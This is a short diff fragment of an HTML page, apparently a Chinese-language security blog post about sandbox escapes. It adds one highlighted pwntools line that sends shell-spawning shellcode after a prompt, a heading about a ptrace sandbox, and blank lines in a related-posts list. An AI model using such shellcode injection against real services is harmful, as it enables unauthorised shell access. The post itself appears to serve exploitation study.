+	<span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">puchid:</span><span class="sh">"</span><span class="p">,</span> <span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="nf">sh</span><span class="p">()))</span>
 </code></pre></div></div>
 
 <h2 id="一个相对完善的-ptrace-sandbox">一个相对完善的 ptrace sandbox</h2>
@@ -948,6 +949,14 @@ call qword ptr [rax + 0x28];
       <h3 class="related-posts-title">RELATED POSTS</h3>
       <div class="related-posts-list">
         
+    
+      
+        
+        
+        
+
+        
+      
     
       
         
